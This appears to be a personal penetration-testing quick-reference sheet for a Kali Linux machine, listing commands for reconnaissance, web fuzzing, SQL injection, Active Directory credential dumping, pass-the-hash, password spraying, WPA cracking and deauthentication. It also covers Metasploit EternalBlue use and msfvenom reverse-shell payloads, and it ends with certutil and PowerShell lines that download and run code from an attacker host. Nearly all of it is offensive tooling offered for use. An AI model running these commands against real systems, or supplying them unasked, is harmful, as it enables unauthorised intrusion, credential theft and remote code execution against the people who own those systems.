# Quick Reference Guide — ashborn Kali 2025.4
**Last Updated:** 2026-04-14

---

## System Info
- **Hostname:** ashborn | **User:** dxverm | **Shell:** zsh
- **IP:** 192.168.0.100 (wlan0, DHCP) | **eth0:** DOWN
- **CPU:** i7-8565U (8T) | **RAM:** 32GB | **Disk:** 404GB free
- **GPU:** AMD Radeon PRO WX 3200 (OpenCL: PoCL only)

---

## Common Reconnaissance Commands

```bash
# Quick host discovery
sudo nmap -sn 192.168.0.0/24 -oG - | grep Up

# Fast port scan (all ports) → detailed scan
rustscan -a TARGET -- -sV -sC            # (after rustscan installed)
sudo nmap -p- --min-rate 5000 TARGET -oN ports.txt
sudo nmap -p PORT1,PORT2 -sV -sC -A TARGET -oN detailed.txt

# Subdomain enumeration
amass enum -d DOMAIN -o amass-out.txt
theHarvester -d DOMAIN -b all -f harvest-out
subfinder -d DOMAIN -o subfinder-out.txt   # (after install)

# Web probing
httpx -l hosts.txt -title -status-code -tech-detect
cat hosts.txt | httpx -silent -o live.txt

# DNS recon
dnsrecon -d DOMAIN -t std,brt
```

---

## Web Application Testing

```bash
# Directory fuzzing
gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt
ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302
feroxbuster -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt  # after install

# Parameter fuzzing
wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt --hc 404 http://TARGET/FUZZ

# SQL injection
sqlmap -u "http://TARGET/page?id=1" --batch --dbs
sqlmap -r request.txt --batch --level 3 --risk 2

# SSL testing
sslscan TARGET:443
testssl.sh TARGET     # after install

# WordPress
wpscan --url http://TARGET --enumerate u,p,t
```

---

## Network Services Enumeration

```bash
# SMB
smbclient -L //TARGET -N
smbmap -H TARGET -u '' -p ''
nxc smb TARGET -u '' -p '' --shares
enum4linux -a TARGET

# LDAP / AD
ldapsearch -x -H ldap://TARGET -b "DC=domain,DC=local" -s sub "(objectclass=*)"
python3 /usr/bin/ldapdomaindump -u DOMAIN\\user -p 'pass' ldap://TARGET

# Kerberos
kerbrute userenum -d DOMAIN --dc DC_IP usernames.txt   # after install

# NFS
showmount -e TARGET

# FTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://TARGET
```

---

## Password Attacks

```bash
# Crack NTLM hashes (hashcat)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Kerberoasting
# (get tickets via impacket)
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP -request
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# AS-REP Roasting
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC_IP
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# Spray attacks
nxc smb TARGET -u users.txt -p 'Password1' --continue-on-success
hydra -L users.txt -p 'Password1' TARGET smb
```

---

## Active Directory Attacks

```bash
# BloodHound collection (after install)
bloodhound-python -u USER -p PASS -d DOMAIN -dc DC_IP -c All --zip

# secretsdump (impacket)
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py DOMAIN/user:pass@TARGET

# Pass the Hash
nxc smb TARGET -u Administrator -H NTLM_HASH --exec-method wmiexec -x "whoami"
evil-winrm -i TARGET -u Administrator -H NTLM_HASH

# Certificate attacks (certipy)
certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP
certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -template UserAuthentication

# DPAPI
dploot credentials -d DOMAIN -u USER -p PASS TARGET
```

---

## Pivoting & Tunneling

```bash
# chisel (after install) — server on attacker
chisel server -p 8080 --reverse
# client on victim
chisel client ATTACKER_IP:8080 R:socks

# SSH tunneling
ssh -D 1080 -N user@pivot_host          # SOCKS5 proxy
ssh -L LOCAL_PORT:TARGET:TARGET_PORT user@pivot_host  # local forward

# ligolo-ng (after install)
# https://github.com/nicocha30/ligolo-ng
```

---

## Wireless Testing

```bash
# Monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Capture handshakes
sudo airodump-ng wlan0mon
sudo airodump-ng -c CHANNEL --bssid BSSID -w capture wlan0mon

# Deauth
sudo aireplay-ng --deauth 100 -a BSSID wlan0mon

# Crack WPA2
hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt
aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt

# Automated
sudo wifite --wpa --wps

# Kismet (passive WiFi/BT monitoring)
sudo kismet -c wlan0
```

---

## Reverse Engineering

```bash
# radare2
r2 -A binary                   # analyze
r2 -d binary                   # debug
afl    # list functions
pdf @main    # disassemble main

# GDB
gdb ./binary
pwndbg> checksec     # after pwndbg install

# binwalk
binwalk -e firmware.bin         # extract
binwalk -M -e firmware.bin      # recursive extract

# exiftool
exiftool file.jpg               # metadata
```

---

## Useful Aliases (add to ~/.zshrc)

```bash
# Nmap quick aliases
alias nmap-quick='sudo nmap -sV --open -F'
alias nmap-full='sudo nmap -p- --min-rate 5000'
alias nmap-scripts='sudo nmap -sV -sC -p'

# Wordlist shortcuts
alias wl-web='/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt'
alias wl-pass='/usr/share/wordlists/rockyou.txt'

# Tool shortcuts
alias msf='msfconsole -q'
alias empire='sudo powershell-empire server'
alias nb='netexec smb'

# Useful utilities
alias myip='ip addr show wlan0 | grep "inet " | awk "{print \$2}"'
alias ports='ss -tulpn'
alias listening='ss -tulpn | grep LISTEN'
```

---

## Impacket Script Locations

```bash
ls /usr/share/doc/python3-impacket/examples/
# Key scripts:
# secretsdump.py — Dump secrets via SMB
# psexec.py — Remote execution
# wmiexec.py — WMI execution
# smbexec.py — SMB execution
# GetUserSPNs.py — Kerberoasting
# GetNPUsers.py — AS-REP roasting
# lookupsid.py — SID enumeration
# reg.py — Remote registry
# mssqlclient.py — MSSQL shell
```

---

## Metasploit Quick Reference

```bash
msfconsole -q
msf6> search type:exploit platform:windows
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> set RHOSTS TARGET
msf6> set LHOST ATTACKER_IP
msf6> run

# Generate payloads
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o payload.elf

# msfpc helper
msfpc windows 192.168.0.100 4444
```

---

## File Transfer Methods

```bash
# From Linux to target
python3 -m http.server 80
sudo impacket-smbserver share . -smb2support

# Certutil (Windows target)
certutil -urlcache -split -f http://ATTACKER/file.exe file.exe

# PowerShell (Windows target)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')
```
